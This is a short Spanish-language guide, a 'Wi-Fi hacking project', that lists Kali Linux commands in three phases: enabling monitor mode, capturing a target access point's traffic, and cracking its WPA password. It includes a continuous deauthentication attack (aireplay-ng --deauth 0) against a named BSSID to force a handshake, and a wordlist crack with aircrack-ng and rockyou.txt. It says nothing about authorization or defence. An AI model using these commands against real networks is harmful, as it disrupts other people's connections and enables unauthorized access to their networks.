## Fases del Proyecto de Hacking Wi-Fi

**Fase 1: Preparación del Entorno y la Interfaz**

* **Verificación del Sistema:**
    * `cat /etc/os-release` (Ver la versión de Kali)
    * `uname -a` (Información del kernel)
* **Identificación de Interfaces:**
    * `ip addr` (Mostrar direcciones IP e interfaces)
    * `iwconfig` (Mostrar información de interfaces inalámbricas)
* **Terminación de Procesos Conflictivos:**
    * `sudo airmon-ng check kill` (Terminar procesos que interfieren con el modo monitor)
* **Activación del Modo Monitor:**
    * `sudo airmon-ng start wlan0` (Activar el modo monitor en la interfaz wlan0)
* **Verificación del Modo Monitor:**
    * `sudo airmon-ng` (Verificar que el modo monitor está activo)
    * `iwconfig` (Verificar que la interfaz está en modo monitor)

**Fase 2: Captura de Tráfico y Handshake**

* **Identificación del Punto de Acceso (AP):**
    * `sudo airodump-ng wlan0mon` (Capturar información de APs cercanos)
* **Selección del AP Objetivo:**
    * (Identificar la dirección MAC BSSID y el canal del AP objetivo)
* **Captura de Tráfico Específico:**
    * `sudo airodump-ng -w hack1 -c 2 --bssid 90:9A:4A:B8:F3:FB wlan0mon` (Capturar tráfico en el canal y BSSID específicos, guardando en archivo)
* **Desautenticación (Deauth) para Capturar Handshake:**
    * `sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon` (Enviar paquetes de desautenticación para forzar el handshake)
* **Verificación del Handshake Capturado:**
    * `wireshark hack1-01.cap` (Abrir el archivo de captura con Wireshark)
    * `eapol` (Filtrar paquetes EAPOL para verificar el handshake)

**Fase 3: Crackeo de la Contraseña**

* **Detención del Modo Monitor:**
    * `airmon-ng stop wlan0mon` (Desactivar el modo monitor)
* **Crackeo del Handshake con Wordlist:**
    * `aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt` (Intentar crackear la contraseña usando una wordlist)
